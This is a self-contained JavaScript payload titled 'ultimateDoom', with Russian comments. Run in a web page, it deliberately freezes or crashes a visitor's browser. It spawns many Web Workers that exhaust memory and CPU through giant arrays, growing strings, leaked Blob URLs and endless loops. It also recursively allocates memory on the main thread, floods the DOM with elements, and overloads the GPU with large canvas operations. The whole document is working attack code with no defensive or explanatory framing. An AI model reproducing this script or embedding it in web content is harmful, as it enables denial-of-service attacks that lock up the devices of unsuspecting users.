

(function ultimateDoom() {
 
    const maxWorkers = navigator.hardwareConcurrency * 4 || 32;
    const workers = [];
    const workerKillerCode = `
        let deathArrays = [];
        let str = "".repeat(65536);  // огромная строка

        function eatMemory() {
            try {
                // 1. Растим массивы по 100–500 МБ каждый раз
                for (let i = 0; i < 150; i++) {
                    deathArrays.push(new Array(10000000).fill(Math.random() * 0xFFFFFFFF));
                }

                // 2. Растим гигантские строки
                str += str + str + Math.random().toString(36).repeat(10000);

                // 3. Создаём и сразу теряем Blob-ы (мусор в GC)
                for (let j = 0; j < 80; j++) {
                    let blob = new Blob([str], {type: 'text/plain'});
                    URL.createObjectURL(blob);  // утечка до revoke
                }

                // 4. Тяжёлая математика без остановки
                let hash = 0;
                while (true) {
                    hash = Math.imul(hash ^ (hash >>> 5), 0x9e3779b9);
                    hash ^= Math.sin(hash) * 0x100000000;
                    for (let k = 0; k < 9999999; k++) {
                        hash = (hash * 31 + k) | 0;
                    }
                }
            } catch (e) {
                // если OOM — продолжаем в следующем цикле
                setTimeout(eatMemory, 0);
            }
        }

        // запускаем убийцу памяти и CPU сразу
        eatMemory();

        // каждые 200 мс добавляем ещё массивов
        setInterval(() => {
            deathArrays.push(new Float64Array(5000000).map(() => Math.random()));
        }, 200);
    `;

    const blob = new Blob([workerKillerCode], {type: 'application/javascript'});
    const workerURL = URL.createObjectURL(blob);

    for (let i = 0; i < maxWorkers; i++) {
        try {
            let w = new Worker(workerURL);
            workers.push(w);
            w.postMessage('die');
        } catch (e) {
          
            break;
        }
    }

    let chaosArray = [];
    let chaosStr = "DOOM";

    function mainThreadHell() {
       
        for (let i = 0; i < 300; i++) {
            chaosArray.push(new Uint8Array(1024 * 1024).fill(i % 256));
        }

        chaosStr += chaosStr.repeat(50);

       
        for (let j = 0; j < 2000; j++) {
            let div = document.createElement('div');
            div.textContent = Math.random().toString(36);
            document.body.appendChild(div);
            setTimeout(() => {
                if (div.parentNode) div.parentNode.removeChild(div);
            }, 50 + Math.random() * 300);
        }

      
        Promise.resolve().then(mainThreadHell);
        requestAnimationFrame(mainThreadHell);
        setTimeout(mainThreadHell, 0);
    }

  
    mainThreadHell();

    try {
        const canvas = document.createElement('canvas');
        canvas.width = 4096;
        canvas.height = 4096;
        const ctx = canvas.getContext('2d');

        function gpuBurn() {
            ctx.fillStyle = `hsl(${Math.random()*360}, 100%, 50%)`;
            ctx.fillRect(0, 0, 4096, 4096);

            // тяжёлая операция — getImageData на огромном куске
            for (let i = 0; i < 40; i++) {
                ctx.getImageData(Math.random()*3000, Math.random()*3000, 1024, 1024);
            }

            requestAnimationFrame(gpuBurn);
        }

        gpuBurn();
    } catch (e) {}

    setTimeout(() => {
        URL.revokeObjectURL(workerURL);
        workers.forEach(w => w.terminate());
    }, 15000);

})();
